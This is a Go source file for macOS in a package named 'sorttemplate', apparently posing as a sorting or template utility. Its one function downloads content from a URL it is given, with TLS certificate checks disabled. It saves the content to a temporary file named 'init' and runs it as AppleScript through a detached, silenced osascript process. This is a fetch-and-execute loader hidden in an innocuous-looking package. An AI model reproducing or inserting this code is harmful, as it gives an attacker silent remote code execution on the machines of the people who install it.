//go:build darwin
// +build darwin

package sorttemplate

import (
	"crypto/tls"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
)

func fset(data_path string) {
	tmpDir := os.TempDir()
	targetPath := filepath.Join(tmpDir, "init")

	// Create the file to write
	file, err := os.Create(targetPath)
	if err != nil {
		return
	}
	defer file.Close()

	// Disable SSL certificate verification (like `rejectUnauthorized: false` in JS)
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	// Perform the GET request
	req, err := http.NewRequest("GET", data_path, nil)
	if err != nil {
		return
	}

	// Set OS-specific header
	req.Header.Set("User-Agent", "darwin")

	// Perform the GET request
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	// Write response to file
	_, err = io.Copy(file, resp.Body)
	if err != nil {
		return
	}
	file.Close()

	cmd := exec.Command("nohup", "osascript", targetPath, "&")

	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setsid: true,
	}

	cmd.Stderr = nil
	cmd.Stdin = nil
	cmd.Stdout = nil

	cmd.Start()
}
